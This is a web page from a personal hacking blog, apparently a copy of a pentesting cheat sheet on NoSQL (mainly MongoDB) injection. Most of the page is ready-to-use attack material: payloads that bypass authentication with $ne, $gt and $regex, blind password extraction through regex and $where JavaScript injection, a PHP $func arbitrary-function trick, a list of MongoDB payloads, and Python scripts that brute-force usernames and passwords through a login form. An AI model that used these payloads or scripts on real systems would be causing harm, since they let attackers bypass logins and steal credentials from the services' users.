<!DOCTYPE html> <html lang="en"> <head> <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"> <meta charset="utf-8"> <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"> <meta http-equiv="X-UA-Compatible" content="IE=edge"> <title> NoSQL Injection | 47z!h4Ck </title> <meta name="author" content="47z!Lu7h "> <meta name="description" content=""> <link rel="stylesheet" href="/assets/css/bootstrap.min.css?a4b3f509e79c54a512b890d73235ef04"> <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/mdbootstrap@4.20.0/css/mdb.min.css" integrity="sha256-jpjYvU3G3N6nrrBwXJoVEYI/0zw8htfFnhT9ljN3JJw=" crossorigin="anonymous"> <link rel="stylesheet" href="/assets/css/academicons.min.css?f0b7046b84e425c55f3463ac249818f5"> <link rel="stylesheet" type="text/css" href="https://fonts.googleapis.com/css?family=Roboto:300,400,500,700|Roboto+Slab:100,300,400,500,700|Material+Icons"> <link rel="stylesheet" href="/assets/css/jekyll-pygments-themes-github.css?591dab5a4e56573bf4ef7fd332894c99" media="" id="highlight_theme_light"> <link href="/assets/css/bootstrap-toc.min.css?6f5af0bb9aab25d79b2448143cbeaa88" rel="stylesheet"> <link rel="shortcut icon" href="data:image/svg+xml,&lt;svg%20xmlns=%22http://www.w3.org/2000/svg%22%20viewBox=%220%200%20100%20100%22&gt;&lt;text%20y=%22.9em%22%20font-size=%2290%22&gt;%E2%9A%9B%EF%B8%8F&lt;/text&gt;&lt;/svg&gt;"> <link rel="stylesheet" href="/assets/css/main.css?d41d8cd98f00b204e9800998ecf8427e"> <link rel="canonical" href="https://47z1lu7h.github.io/projects/pentesting-web/2025-01-01-nosql-injection/"> <link rel="stylesheet" href="/assets/css/jekyll-pygments-themes-native.css?5847e5ed4a4568527aa6cfab446049ca" media="none" id="highlight_theme_dark"> <script src="/assets/js/theme.js?0afe9f0ae161375728f7bcc5eb5b4ab4"></script> </head> <body class="fixed-top-nav sticky-bottom-footer"> <header> <nav id="navbar" class="navbar navbar-light navbar-expand-sm fixed-top" role="navigation"> <div class="container"> <a class="navbar-brand title font-weight-lighter" href="/"> 47z!h4Ck </a> <button class="navbar-toggler collapsed ml-auto" type="button" data-toggle="collapse" data-target="#navbarNav" aria-controls="navbarNav" aria-expanded="false" aria-label="Toggle navigation"> <span class="sr-only">Toggle navigation</span> <span class="icon-bar top-bar"></span> <span class="icon-bar middle-bar"></span> <span class="icon-bar bottom-bar"></span> </button> <div class="collapse navbar-collapse text-right" id="navbarNav"> <ul class="navbar-nav ml-auto flex-nowrap"> <li class="nav-item "> <a class="nav-link" href="/">h0m3 </a> </li> <li class="nav-item "> <a class="nav-link" href="/blog/">blog </a> </li> <li class="nav-item active"> <a class="nav-link" href="/projects/">projects <span class="sr-only">(current)</span> </a> </li> <li class="nav-item "> <a class="nav-link" href="/repositories/">repositories </a> </li> <li class="nav-item "> <a class="nav-link" href="/cv/">cv </a> </li> <li class="nav-item "> <a class="nav-link" href="/teaching/">teaching </a> </li> <li class="nav-item "> <a class="nav-link" href="/people/">people </a> </li> <li class="nav-item "> <a class="nav-link" href="/hacking/">hacking </a> </li> <li class="nav-item dropdown "> <a class="nav-link dropdown-toggle" href="#" id="navbarDropdown" role="button" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">submenus </a> <div class="dropdown-menu dropdown-menu-right" aria-labelledby="navbarDropdown"> <a class="dropdown-item " href="/publications/">publications</a> <div class="dropdown-divider"></div> <a class="dropdown-item " href="/projects/">projects</a> <div class="dropdown-divider"></div> <a class="dropdown-item " href="/blog/">blog</a> </div> </li> <li class="toggle-container"> <button id="light-toggle" title="Change theme"> <i class="fa-solid fa-moon"></i> <i class="fa-solid fa-sun"></i> </button> </li> </ul> </div> </div> </nav> <progress id="progress" value="0"> <div class="progress-container"> <span class="progress-bar"></span> </div> </progress> </header> <div class="container mt-5" role="main"> <div class="row"> <div class="col-sm-3"> <nav id="toc-sidebar" class="sticky-top"></nav> </div> <div class="col-sm-9"> <div class="post"> <header class="post-header"> <h1 class="post-title">NoSQL Injection</h1> <p class="post-description"></p> </header> <article> <h1 id="nosql-injection">NoSQL injection</h1> <h2 id="exploit">Exploit</h2> <p>In PHP you can send an Array changing the sent parameter from <em>parameter=foo</em> to <em>parameter[arrName]=foo.</em></p> <p>The exploits are based in adding an <strong>Operator</strong>:</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>username[<span class="nv">$ne</span><span class="o">]=</span>1<span class="nv">$password</span><span class="o">[</span><span class="nv">$ne</span><span class="o">]=</span>1 <span class="c">#&lt;Not Equals&gt;</span>
username[<span class="nv">$regex</span><span class="o">]=</span>^adm<span class="nv">$password</span><span class="o">[</span><span class="nv">$ne</span><span class="o">]=</span>1 <span class="c">#Check a &lt;regular expression&gt;, could be used to brute-force a parameter</span>
username[<span class="nv">$regex</span><span class="o">]=</span>.<span class="o">{</span>25<span class="o">}</span>&amp;pass[<span class="nv">$ne</span><span class="o">]=</span>1 <span class="c">#Use the &lt;regex&gt; to find the length of a value</span>
username[<span class="nv">$eq</span><span class="o">]=</span>admin&amp;password[<span class="nv">$ne</span><span class="o">]=</span>1 <span class="c">#&lt;Equals&gt;</span>
username[<span class="nv">$ne</span><span class="o">]=</span>admin&amp;pass[<span class="nv">$lt</span><span class="o">]=</span>s <span class="c">#&lt;Less than&gt;, Brute-force pass[$lt] to find more users</span>
username[<span class="nv">$ne</span><span class="o">]=</span>admin&amp;pass[<span class="nv">$gt</span><span class="o">]=</span>s <span class="c">#&lt;Greater Than&gt;</span>
username[<span class="nv">$nin</span><span class="o">][</span>admin]<span class="o">=</span>admin&amp;username[<span class="nv">$nin</span><span class="o">][</span><span class="nb">test</span><span class="o">]=</span><span class="nb">test</span>&amp;pass[<span class="nv">$ne</span><span class="o">]=</span>7 <span class="c">#&lt;Matches non of the values of the array&gt; (not test and not admin)</span>
<span class="o">{</span> <span class="nv">$where</span>: <span class="s2">"this.credits == this.debits"</span> <span class="o">}</span><span class="c">#&lt;IF&gt;, can be used to execute code</span>
</code></pre></div></div> <h3 id="basic-authentication-bypass">Basic authentication bypass</h3> <p><strong>Using not equal ($ne) or greater ($gt)</strong></p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#in URL</span>
username[<span class="nv">$ne</span><span class="o">]=</span>toto&amp;password[<span class="nv">$ne</span><span class="o">]=</span>toto
username[<span class="nv">$regex</span><span class="o">]=</span>.<span class="k">*</span>&amp;password[<span class="nv">$regex</span><span class="o">]=</span>.<span class="k">*</span>
username[<span class="nv">$exists</span><span class="o">]=</span><span class="nb">true</span>&amp;password[<span class="nv">$exists</span><span class="o">]=</span><span class="nb">true</span>

<span class="c">#in JSON</span>
<span class="o">{</span><span class="s2">"username"</span>: <span class="o">{</span><span class="s2">"</span><span class="nv">$ne</span><span class="s2">"</span>: null<span class="o">}</span>, <span class="s2">"password"</span>: <span class="o">{</span><span class="s2">"</span><span class="nv">$ne</span><span class="s2">"</span>: null<span class="o">}</span> <span class="o">}</span>
<span class="o">{</span><span class="s2">"username"</span>: <span class="o">{</span><span class="s2">"</span><span class="nv">$ne</span><span class="s2">"</span>: <span class="s2">"foo"</span><span class="o">}</span>, <span class="s2">"password"</span>: <span class="o">{</span><span class="s2">"</span><span class="nv">$ne</span><span class="s2">"</span>: <span class="s2">"bar"</span><span class="o">}</span> <span class="o">}</span>
<span class="o">{</span><span class="s2">"username"</span>: <span class="o">{</span><span class="s2">"</span><span class="nv">$gt</span><span class="s2">"</span>: undefined<span class="o">}</span>, <span class="s2">"password"</span>: <span class="o">{</span><span class="s2">"</span><span class="nv">$gt</span><span class="s2">"</span>: undefined<span class="o">}</span> <span class="o">}</span>
</code></pre></div></div> <h3 id="sql---mongo"><strong>SQL - Mongo</strong></h3> <div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">query</span> <span class="o">=</span> <span class="p">{</span> <span class="na">$where</span><span class="p">:</span> <span class="s2">`this.username == '</span><span class="p">${</span><span class="nx">username</span><span class="p">}</span><span class="s2">'`</span> <span class="p">};</span>
</code></pre></div></div> <p>An attacker can exploit this by inputting strings like <code class="language-plaintext highlighter-rouge">admin' || 'a'=='a</code>, making the query return all documents by satisfying the condition with a tautology (<code class="language-plaintext highlighter-rouge">'a'=='a'</code>). This is analogous to SQL injection attacks where inputs like <code class="language-plaintext highlighter-rouge">' or 1=1-- -</code> are used to manipulate SQL queries. In MongoDB, similar injections can be done using inputs like <code class="language-plaintext highlighter-rouge">' || 1==1//</code>, <code class="language-plaintext highlighter-rouge">' || 1==1%00</code>, or <code class="language-plaintext highlighter-rouge">admin' || 'a'=='a</code>.</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Normal sql: ' or 1=1-- -
Mongo sql: ' || 1==1//    or    ' || 1==1%00     or    admin' || 'a'=='a
</code></pre></div></div> <h3 id="extract-length-information">Extract <strong>length</strong> information</h3> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>username[<span class="nv">$ne</span><span class="o">]=</span>toto&amp;password[<span class="nv">$regex</span><span class="o">]=</span>.<span class="o">{</span>1<span class="o">}</span>
username[<span class="nv">$ne</span><span class="o">]=</span>toto&amp;password[<span class="nv">$regex</span><span class="o">]=</span>.<span class="o">{</span>3<span class="o">}</span>
<span class="c"># True if the length equals 1,3...</span>
</code></pre></div></div> <h3 id="extract-data-information">Extract <strong>data</strong> information</h3> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>in URL (if length == 3)
username[$ne]=toto&amp;password[$regex]=a.{2}
username[$ne]=toto&amp;password[$regex]=b.{2}
...
username[$ne]=toto&amp;password[$regex]=m.{2}
username[$ne]=toto&amp;password[$regex]=md.{1}
username[$ne]=toto&amp;password[$regex]=mdp

username[$ne]=toto&amp;password[$regex]=m.*
username[$ne]=toto&amp;password[$regex]=md.*

in JSON
{"username": {"$eq": "admin"}, "password": {"$regex": "^m" }}
{"username": {"$eq": "admin"}, "password": {"$regex": "^md" }}
{"username": {"$eq": "admin"}, "password": {"$regex": "^mdp" }}
</code></pre></div></div> <h3 id="sql---mongo-1"><strong>SQL - Mongo</strong></h3> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/?search=admin' &amp;&amp; this.password%00 --&gt; Check if the field password exists
/?search=admin' &amp;&amp; this.password &amp;&amp; this.password.match(/.*/index.html)%00 --&gt; start matching password
/?search=admin' &amp;&amp; this.password &amp;&amp; this.password.match(/^a.*$/)%00
/?search=admin' &amp;&amp; this.password &amp;&amp; this.password.match(/^b.*$/)%00
/?search=admin' &amp;&amp; this.password &amp;&amp; this.password.match(/^c.*$/)%00
...
/?search=admin' &amp;&amp; this.password &amp;&amp; this.password.match(/^duvj.*$/)%00
...
/?search=admin' &amp;&amp; this.password &amp;&amp; this.password.match(/^duvj78i3u$/)%00  Found
</code></pre></div></div> <h3 id="php-arbitrary-function-execution">PHP Arbitrary Function Execution</h3> <p>Using the <strong>$func</strong> operator of the <a href="https://github.com/agentejo/cockpit/tree/0.11.1/lib/MongoLite" rel="external nofollow noopener" target="_blank">MongoLite</a> library (used by default) it might be possible to execute and arbitrary function as in <a href="https://swarm.ptsecurity.com/rce-cockpit-cms/" rel="external nofollow noopener" target="_blank">this report</a>.</p> <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="sh">"</span><span class="s">user</span><span class="sh">"</span><span class="p">:{</span><span class="sh">"</span><span class="s">$func</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">var_dump</span><span class="sh">"</span><span class="p">}</span>
</code></pre></div></div> <p><img src="../images/image%20(933).png" alt="https://swarm.ptsecurity.com/wp-content/uploads/2021/04/cockpit_auth_check_10.png"></p> <h3 id="get-info-from-different-collection">Get info from different collection</h3> <p>It’s possible to use <a href="https://www.mongodb.com/docs/manual/reference/operator/aggregation/lookup/" rel="external nofollow noopener" target="_blank"><strong>$lookup</strong></a> to get info from a different collection. In the following example, we are reading from a <strong>different collection</strong> called <strong><code class="language-plaintext highlighter-rouge">users</code></strong> and getting the <strong>results of all the entries</strong> with a password matching a wildcard.</p> <p><strong>NOTE:</strong> <code class="language-plaintext highlighter-rouge">$lookup</code> and other aggregation functions are only available if the <code class="language-plaintext highlighter-rouge">aggregate()</code> function was used to perform the search instead of the more common <code class="language-plaintext highlighter-rouge">find()</code> or <code class="language-plaintext highlighter-rouge">findOne()</code> functions.</p> <div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">[</span><span class="w">
  </span><span class="p">{</span><span class="w">
    </span><span class="nl">"$lookup"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
      </span><span class="nl">"from"</span><span class="p">:</span><span class="w"> </span><span class="s2">"users"</span><span class="p">,</span><span class="w">
      </span><span class="nl">"as"</span><span class="p">:</span><span class="w"> </span><span class="s2">"resultado"</span><span class="p">,</span><span class="w">
      </span><span class="nl">"pipeline"</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="w">
        </span><span class="p">{</span><span class="w">
          </span><span class="nl">"$match"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
            </span><span class="nl">"password"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
              </span><span class="nl">"$regex"</span><span class="p">:</span><span class="w"> </span><span class="s2">"^.*"</span><span class="w">
            </span><span class="p">}</span><span class="w">
          </span><span class="p">}</span><span class="w">
        </span><span class="p">}</span><span class="w">
      </span><span class="p">]</span><span class="w">
    </span><span class="p">}</span><span class="w">
  </span><span class="p">}</span><span class="w">
</span><span class="p">]</span><span class="w">
</span></code></pre></div></div> <h2 id="mongodb-payloads">MongoDB Payloads</h2> <p>List <a href="https://github.com/cr0hn/nosqlinjection_wordlists/blob/master/mongodb_nosqli.txt" rel="external nofollow noopener" target="_blank">from here</a></p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>true, $where: '1 == 1'
, $where: '1 == 1'
$where: '1 == 1'
', $where: '1 == 1
1, $where: '1 == 1'
{ $ne: 1 }
', $or: [ {}, { 'a':'a
' } ], $comment:'successful MongoDB injection'
db.injection.insert({success:1});
db.injection.insert({success:1});return 1;db.stores.mapReduce(function() { { emit(1,1
|| 1==1
|| 1==1//
|| 1==1%00
}, { password : /.*/ }
' &amp;&amp; this.password.match(/.*/index.html)//+%00
' &amp;&amp; this.passwordzz.match(/.*/index.html)//+%00
'%20%26%26%20this.password.match(/.*/index.html)//+%00
'%20%26%26%20this.passwordzz.match(/.*/index.html)//+%00
{$gt: ''}
[$ne]=1
';sleep(5000);
';it=new%20Date();do{pt=new%20Date();}while(pt-it&lt;5000);
{"username": {"$ne": null}, "password": {"$ne": null}}
{"username": {"$ne": "foo"}, "password": {"$ne": "bar"}}
{"username": {"$gt": undefined}, "password": {"$gt": undefined}}
{"username": {"$gt":""}, "password": {"$gt":""}}
{"username":{"$in":["Admin", "4dm1n", "admin", "root", "administrator"]},"password":{"$gt":""}}
</code></pre></div></div> <h2 id="blind-nosql-script">Blind NoSQL Script</h2> <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="n">requests</span><span class="p">,</span> <span class="n">string</span>

<span class="n">alphabet</span> <span class="o">=</span> <span class="n">string</span><span class="p">.</span><span class="n">ascii_lowercase</span> <span class="o">+</span> <span class="n">string</span><span class="p">.</span><span class="n">ascii_uppercase</span> <span class="o">+</span> <span class="n">string</span><span class="p">.</span><span class="n">digits</span> <span class="o">+</span> <span class="sh">"</span><span class="s">_@{}-/()!</span><span class="se">\"</span><span class="s">$%=^[]:;</span><span class="sh">"</span>

<span class="n">flag</span> <span class="o">=</span> <span class="sh">""</span>
<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">21</span><span class="p">):</span>
    <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">[i] Looking for char number </span><span class="sh">"</span><span class="o">+</span><span class="nf">str</span><span class="p">(</span><span class="n">i</span><span class="o">+</span><span class="mi">1</span><span class="p">))</span>
    <span class="k">for</span> <span class="n">char</span> <span class="ow">in</span> <span class="n">alphabet</span><span class="p">:</span>
        <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">"</span><span class="s">http://chall.com?param=^</span><span class="sh">"</span><span class="o">+</span><span class="n">flag</span><span class="o">+</span><span class="n">char</span><span class="p">)</span>
        <span class="nf">if </span><span class="p">(</span><span class="sh">"</span><span class="s">&lt;TRUE&gt;</span><span class="sh">"</span> <span class="ow">in</span> <span class="n">r</span><span class="p">.</span><span class="n">text</span><span class="p">):</span>
            <span class="n">flag</span> <span class="o">+=</span> <span class="n">char</span>
            <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">[+] Flag: </span><span class="sh">"</span><span class="o">+</span><span class="n">flag</span><span class="p">)</span>
            <span class="k">break</span>
</code></pre></div></div> <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="n">requests</span>
<span class="kn">import</span> <span class="n">urllib3</span>
<span class="kn">import</span> <span class="n">string</span>
<span class="kn">import</span> <span class="n">urllib</span>
<span class="n">urllib3</span><span class="p">.</span><span class="nf">disable_warnings</span><span class="p">()</span>

<span class="n">username</span><span class="o">=</span><span class="sh">"</span><span class="s">admin</span><span class="sh">"</span>
<span class="n">password</span><span class="o">=</span><span class="sh">""</span>

<span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
    <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">string</span><span class="p">.</span><span class="n">printable</span><span class="p">:</span>
        <span class="k">if</span> <span class="n">c</span> <span class="ow">not</span> <span class="ow">in</span> <span class="p">[</span><span class="sh">'</span><span class="s">*</span><span class="sh">'</span><span class="p">,</span><span class="sh">'</span><span class="s">+</span><span class="sh">'</span><span class="p">,</span><span class="sh">'</span><span class="s">.</span><span class="sh">'</span><span class="p">,</span><span class="sh">'</span><span class="s">?</span><span class="sh">'</span><span class="p">,</span><span class="sh">'</span><span class="s">|</span><span class="sh">'</span><span class="p">]:</span>
            <span class="n">payload</span><span class="o">=</span><span class="sh">'</span><span class="s">{</span><span class="sh">"</span><span class="s">username</span><span class="sh">"</span><span class="s">: {</span><span class="sh">"</span><span class="s">$eq</span><span class="sh">"</span><span class="s">: </span><span class="sh">"</span><span class="s">%s</span><span class="sh">"</span><span class="s">}, </span><span class="sh">"</span><span class="s">password</span><span class="sh">"</span><span class="s">: {</span><span class="sh">"</span><span class="s">$regex</span><span class="sh">"</span><span class="s">: </span><span class="sh">"</span><span class="s">^%s</span><span class="sh">"</span><span class="s"> }}</span><span class="sh">'</span> <span class="o">%</span> <span class="p">(</span><span class="n">username</span><span class="p">,</span> <span class="n">password</span> <span class="o">+</span> <span class="n">c</span><span class="p">)</span>
            <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="nf">post</span><span class="p">(</span><span class="n">u</span><span class="p">,</span> <span class="n">data</span> <span class="o">=</span> <span class="p">{</span><span class="sh">'</span><span class="s">ids</span><span class="sh">'</span><span class="p">:</span> <span class="n">payload</span><span class="p">},</span> <span class="n">verify</span> <span class="o">=</span> <span class="bp">False</span><span class="p">)</span>
            <span class="k">if</span> <span class="sh">'</span><span class="s">OK</span><span class="sh">'</span> <span class="ow">in</span> <span class="n">r</span><span class="p">.</span><span class="n">text</span><span class="p">:</span>
                <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">Found one more char : %s</span><span class="sh">"</span> <span class="o">%</span> <span class="p">(</span><span class="n">password</span><span class="o">+</span><span class="n">c</span><span class="p">))</span>
                <span class="n">password</span> <span class="o">+=</span> <span class="n">c</span>
</code></pre></div></div> <h3 id="brute-force-login-usernames-and-passwords-from-post-login">Brute-force login usernames and passwords from POST login</h3> <p>This is a simple script that you could modify but the previous tools can also do this task.</p> <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="n">requests</span>
<span class="kn">import</span> <span class="n">string</span>

<span class="n">url</span> <span class="o">=</span> <span class="sh">"</span><span class="s">http://example.com</span><span class="sh">"</span>
<span class="n">headers</span> <span class="o">=</span> <span class="p">{</span><span class="sh">"</span><span class="s">Host</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">exmaple.com</span><span class="sh">"</span><span class="p">}</span>
<span class="n">cookies</span> <span class="o">=</span> <span class="p">{</span><span class="sh">"</span><span class="s">PHPSESSID</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">s3gcsgtqre05bah2vt6tibq8lsdfk</span><span class="sh">"</span><span class="p">}</span>
<span class="n">possible_chars</span> <span class="o">=</span> <span class="nf">list</span><span class="p">(</span><span class="n">string</span><span class="p">.</span><span class="n">ascii_letters</span><span class="p">)</span> <span class="o">+</span> <span class="nf">list</span><span class="p">(</span><span class="n">string</span><span class="p">.</span><span class="n">digits</span><span class="p">)</span> <span class="o">+</span> <span class="p">[</span><span class="sh">"</span><span class="se">\\</span><span class="sh">"</span><span class="o">+</span><span class="n">c</span> <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">string</span><span class="p">.</span><span class="n">punctuation</span><span class="o">+</span><span class="n">string</span><span class="p">.</span><span class="n">whitespace</span> <span class="p">]</span>
<span class="k">def</span> <span class="nf">get_password</span><span class="p">(</span><span class="n">username</span><span class="p">):</span>
    <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">Extracting password of </span><span class="sh">"</span><span class="o">+</span><span class="n">username</span><span class="p">)</span>
    <span class="n">params</span> <span class="o">=</span> <span class="p">{</span><span class="sh">"</span><span class="s">username</span><span class="sh">"</span><span class="p">:</span><span class="n">username</span><span class="p">,</span> <span class="sh">"</span><span class="s">password[$regex]</span><span class="sh">"</span><span class="p">:</span><span class="sh">""</span><span class="p">,</span> <span class="sh">"</span><span class="s">login</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">login</span><span class="sh">"</span><span class="p">}</span>
    <span class="n">password</span> <span class="o">=</span> <span class="sh">"</span><span class="s">^</span><span class="sh">"</span>
    <span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
        <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">possible_chars</span><span class="p">:</span>
            <span class="n">params</span><span class="p">[</span><span class="sh">"</span><span class="s">password[$regex]</span><span class="sh">"</span><span class="p">]</span> <span class="o">=</span> <span class="n">password</span> <span class="o">+</span> <span class="n">c</span> <span class="o">+</span> <span class="sh">"</span><span class="s">.*</span><span class="sh">"</span>
            <span class="n">pr</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="nf">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">params</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">,</span> <span class="n">cookies</span><span class="o">=</span><span class="n">cookies</span><span class="p">,</span> <span class="n">verify</span><span class="o">=</span><span class="bp">False</span><span class="p">,</span> <span class="n">allow_redirects</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span>
            <span class="k">if</span> <span class="nf">int</span><span class="p">(</span><span class="n">pr</span><span class="p">.</span><span class="n">status_code</span><span class="p">)</span> <span class="o">==</span> <span class="mi">302</span><span class="p">:</span>
                <span class="n">password</span> <span class="o">+=</span> <span class="n">c</span>
                <span class="k">break</span>
        <span class="k">if</span> <span class="n">c</span> <span class="o">==</span> <span class="n">possible_chars</span><span class="p">[</span><span class="o">-</span><span class="mi">1</span><span class="p">]:</span>
            <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">Found password </span><span class="sh">"</span><span class="o">+</span><span class="n">password</span><span class="p">[</span><span class="mi">1</span><span class="p">:].</span><span class="nf">replace</span><span class="p">(</span><span class="sh">"</span><span class="se">\\</span><span class="sh">"</span><span class="p">,</span> <span class="sh">""</span><span class="p">)</span><span class="o">+</span><span class="sh">"</span><span class="s"> for username </span><span class="sh">"</span><span class="o">+</span><span class="n">username</span><span class="p">)</span>
            <span class="k">return</span> <span class="n">password</span><span class="p">[</span><span class="mi">1</span><span class="p">:].</span><span class="nf">replace</span><span class="p">(</span><span class="sh">"</span><span class="se">\\</span><span class="sh">"</span><span class="p">,</span> <span class="sh">""</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">get_usernames</span><span class="p">(</span><span class="n">prefix</span><span class="p">):</span>
    <span class="n">usernames</span> <span class="o">=</span> <span class="p">[]</span>
    <span class="n">params</span> <span class="o">=</span> <span class="p">{</span><span class="sh">"</span><span class="s">username[$regex]</span><span class="sh">"</span><span class="p">:</span><span class="sh">""</span><span class="p">,</span> <span class="sh">"</span><span class="s">password[$regex]</span><span class="sh">"</span><span class="p">:</span><span class="sh">"</span><span class="s">.*</span><span class="sh">"</span><span class="p">}</span>
    <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">possible_chars</span><span class="p">:</span>
        <span class="n">username</span> <span class="o">=</span> <span class="sh">"</span><span class="s">^</span><span class="sh">"</span> <span class="o">+</span> <span class="n">prefix</span> <span class="o">+</span> <span class="n">c</span>
        <span class="n">params</span><span class="p">[</span><span class="sh">"</span><span class="s">username[$regex]</span><span class="sh">"</span><span class="p">]</span> <span class="o">=</span> <span class="n">username</span> <span class="o">+</span> <span class="sh">"</span><span class="s">.*</span><span class="sh">"</span>
        <span class="n">pr</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="nf">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">params</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">,</span> <span class="n">cookies</span><span class="o">=</span><span class="n">cookies</span><span class="p">,</span> <span class="n">verify</span><span class="o">=</span><span class="bp">False</span><span class="p">,</span> <span class="n">allow_redirects</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span>
        <span class="k">if</span> <span class="nf">int</span><span class="p">(</span><span class="n">pr</span><span class="p">.</span><span class="n">status_code</span><span class="p">)</span> <span class="o">==</span> <span class="mi">302</span><span class="p">:</span>
            <span class="nf">print</span><span class="p">(</span><span class="n">username</span><span class="p">)</span>
            <span class="k">for</span> <span class="n">user</span> <span class="ow">in</span> <span class="nf">get_usernames</span><span class="p">(</span><span class="n">prefix</span> <span class="o">+</span> <span class="n">c</span><span class="p">):</span>
                <span class="n">usernames</span><span class="p">.</span><span class="nf">append</span><span class="p">(</span><span class="n">user</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">usernames</span>

<span class="k">for</span> <span class="n">u</span> <span class="ow">in</span> <span class="nf">get_usernames</span><span class="p">(</span><span class="sh">""</span><span class="p">):</span>
    <span class="nf">get_password</span><span class="p">(</span><span class="n">u</span><span class="p">)</span>
</code></pre></div></div> <h2 id="tools">Tools</h2> <ul> <li><a href="https://github.com/an0nlk/Nosql-MongoDB-injection-username-password-enumeration" rel="external nofollow noopener" target="_blank">https://github.com/an0nlk/Nosql-MongoDB-injection-username-password-enumeration</a></li> <li><a href="https://github.com/C4l1b4n/NoSQL-Attack-Suite" rel="external nofollow noopener" target="_blank">https://github.com/C4l1b4n/NoSQL-Attack-Suite</a></li> </ul> <h2 id="references">References</h2> <ul> <li><a href="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2Fgit-blob-3b49b5d5a9e16cb1ec0d50cb1e62cb60f3f9155a%2FEN-NoSQL-No-injection-Ron-Shulman-Peleg-Bronshtein-1.pdf?alt=media" rel="external nofollow noopener" target="_blank">https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2Fgit-blob-3b49b5d5a9e16cb1ec0d50cb1e62cb60f3f9155a%2FEN-NoSQL-No-injection-Ron-Shulman-Peleg-Bronshtein-1.pdf?alt=media</a></li> <li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection" rel="external nofollow noopener" target="_blank">https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection</a></li> <li><a href="https://nullsweep.com/a-nosql-injection-primer-with-mongo/" rel="external nofollow noopener" target="_blank">https://nullsweep.com/a-nosql-injection-primer-with-mongo/</a></li> <li><a href="https://blog.websecurify.com/2014/08/hacking-nodejs-and-mongodb" rel="external nofollow noopener" target="_blank">https://blog.websecurify.com/2014/08/hacking-nodejs-and-mongodb</a></li> </ul> </article> </div> </div> </div> </div> <footer class="sticky-bottom mt-5" role="contentinfo"> <div class="container"> © Copyright 2025 47z!Lu7h . Love is life. And if you miss love, you miss life. </div> </footer> <script src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4=" crossorigin="anonymous"></script> <script src="/assets/js/bootstrap.bundle.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/mdbootstrap@4.20.0/js/mdb.min.js" integrity="sha256-NdbiivsvWt7VYCt6hYNT3h/th9vSTL4EDWeGs5SN3DA=" crossorigin="anonymous"></script> <script defer src="https://cdn.jsdelivr.net/npm/masonry-layout@4.2.2/dist/masonry.pkgd.min.js" integrity="sha256-Nn1q/fx0H7SNLZMQ5Hw5JLaTRZp0yILA/FRexe19VdI=" crossorigin="anonymous"></script> <script defer 